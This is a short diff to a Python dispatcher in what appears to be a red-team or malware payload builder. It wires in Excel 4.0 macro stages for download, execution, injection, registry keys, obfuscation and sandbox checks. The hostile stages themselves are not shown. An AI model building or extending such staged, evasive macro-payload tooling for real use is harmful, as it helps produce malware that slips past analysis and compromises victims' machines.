@@ -6,6 +6,10 @@ from stage_builders.gadget2jscript import *
 from stage_builders.xlm_download import *
 from stage_builders.xlm_execute import *
 from stage_builders.xlm_inject import *
+from stage_builders.xlm_regkey import *
+from stage_builders.xlm_obfuscate import *
+from stage_builders.xlm_sandboxcheck import *
+
 
 CONFIG = "configs/OLDFASHIONED.json"
 
@@ -42,9 +46,14 @@ def stage_loader(stage, previous_stage):
         stage_builder = XLM_Inject(stage, previous_stage)
         return stage_builder.build(build_directory)
     elif name == "xlm_sandboxcheck":
-        pass
+        stage_builder = XLM_Sandboxcheck(stage, previous_stage)
+        return stage_builder.build(build_directory)
     elif name == "xlm_obfuscate":
-        pass
+        stage_builder = XLM_Obfuscate(stage, previous_stage)
+        return stage_builder.build(build_directory)
+    elif name == "xlm_regkey":
+        stage_builder = XLM_Regkey(stage, previous_stage)
+        return stage_builder.build(build_directory)
     else: 
         print("Stage {} not supported".format(name))
         return False
